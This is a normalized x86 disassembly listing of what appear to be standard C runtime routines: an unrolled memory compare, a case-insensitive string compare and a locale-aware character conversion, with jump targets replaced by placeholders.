test ecx ecx
jne r-xdata
movzx edi [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ edx + 0x8 ]
je r-xdata
movzx edi [ esi + 0x5 ]
movzx eax [ edx + 0x5 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x3 ]
movzx eax [ edx + 0x3 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x2 ]
movzx eax [ edx - 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1d ]
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x8 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x6 ]
movzx eax [ edx + 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx ecx [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1 ]
movzx eax [ edx - 0x1 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x2 ]
movzx eax [ edx - 0x2 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0xc ]
cmp eax [ edx + 0xc ]
je r-xdata
movzx edi [ esi + 0x9 ]
movzx eax [ edx + 0x9 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x7 ]
movzx eax [ edx + 0x7 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0xc ]
sub edi eax
je r-xdata
movzx edi [ esi + 0xa ]
movzx eax [ edx + 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ edx + 0x10 ]
je r-xdata
movzx edi [ esi + 0xd ]
movzx eax [ edx + 0xd ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0xb ]
movzx eax [ edx + 0xb ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx eax [ edx + 0x10 ]
movzx edi [ esi + 0x10 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0xe ]
movzx eax [ edx + 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax [ edx + 0x14 ]
je r-xdata
movzx edi [ esi + 0x11 ]
movzx eax [ edx + 0x11 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0xf ]
movzx eax [ edx + 0xf ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x14 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x12 ]
movzx eax [ edx + 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax [ edx + 0x18 ]
je r-xdata
movzx edi [ esi + 0x15 ]
movzx eax [ edx + 0x15 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x13 ]
movzx eax [ edx + 0x13 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x18 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x16 ]
movzx eax [ edx + 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x1c ]
cmp eax [ edx + 0x1c ]
je r-xdata
movzx edi [ esi + 0x19 ]
movzx eax [ edx + 0x19 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x17 ]
movzx eax [ edx + 0x17 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x1c ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x1a ]
movzx eax [ edx + 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
push 0x20
pop ecx
sub ebx ecx
add esi ecx
add edx ecx
cmp ebx ecx
jae r-xdata
movzx edi [ esi + 0x1d ]
movzx eax [ edx + 0x1d ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x1b ]
movzx eax [ edx + 0x1b ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi + 0x1e ]
movzx eax [ edx + 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx ecx [ esi + 0x1f ]
movzx eax [ edx + 0x1f ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
sub_41a620
push ebx
push esi
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
test ebx 0xffffffff
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub ecx edx
test edx 0x3
je r-xdata
lea eax [ edx + ecx ]
and eax 0xfff
cmp eax 0xffc
ja r-xdata
movzx eax [ edx + ecx ]
cmp al [ edx ]
jne r-xdata
mov eax [ edx + ecx ]
cmp eax [ edx ]
jne r-xdata
sbb eax eax
or eax 0x1
pop esi
pop ebx
retn
test eax eax
cmove ebx eax
inc edx
sub ebx 0x1
jbe r-xdata
sub ebx 0x4
jbe r-xdata
test dl 0x3
jne r-xdata
lea esi [ eax - 0x1010101 ]
add edx 0x4
not eax
and eax esi
test eax 0x80808080
je r-xdata
sub_41a698
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a703
add esp 0x10
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
mov eax 0x7fffffff
jmp r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_41a7c0
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
mov eax esi
jmp r-xdata
sub_41a703
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
leave
retn
push ebx
push esi
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_411f0f
mov edi [ ebp + 0x8 ]
mov esi 0x7fffffff
test edi edi
je r-xdata
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx esi
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
sub edi ebx
push ecx
push ebx
push edi
call sub_41a7c0
add esp 0xc
mov esi eax
jmp r-xdata
sub esi eax
test esi esi
je r-xdata
cmp esi eax
je r-xdata
movzx eax [ edi + ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41a821
mov esi eax
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41a821
add esp 0x10
inc ebx
dec [ ebp + 0x10 ]
je r-xdata
sub_41a7c0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_41a821
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push edi
push [ ebp + 0xc ]
call sub_411f0f
mov ebx [ ebp + 0x8 ]
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x74 ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0x74 ] 0x1
jle r-xdata
call sub_410eb4
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov eax ebx
sar eax 0x8
mov [ ebp + 0x8 ] eax
lea ecx [ ebp - 0x18 ]
movzx eax al
push ecx
push eax
call sub_41742d
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0x90 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_41a962
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
mov eax [ ecx + 0x94 ]
movzx ecx [ eax + ebx ]
je r-xdata
test eax eax
je r-xdata
movzx edx [ ebp - 0x8 ]
movzx eax [ ebp - 0x7 ]
shl edx 0x8
or edx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
movzx eax [ ebp - 0x8 ]
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push edi
push [ eax + 0xa8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_41853f
add esp 0x24
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
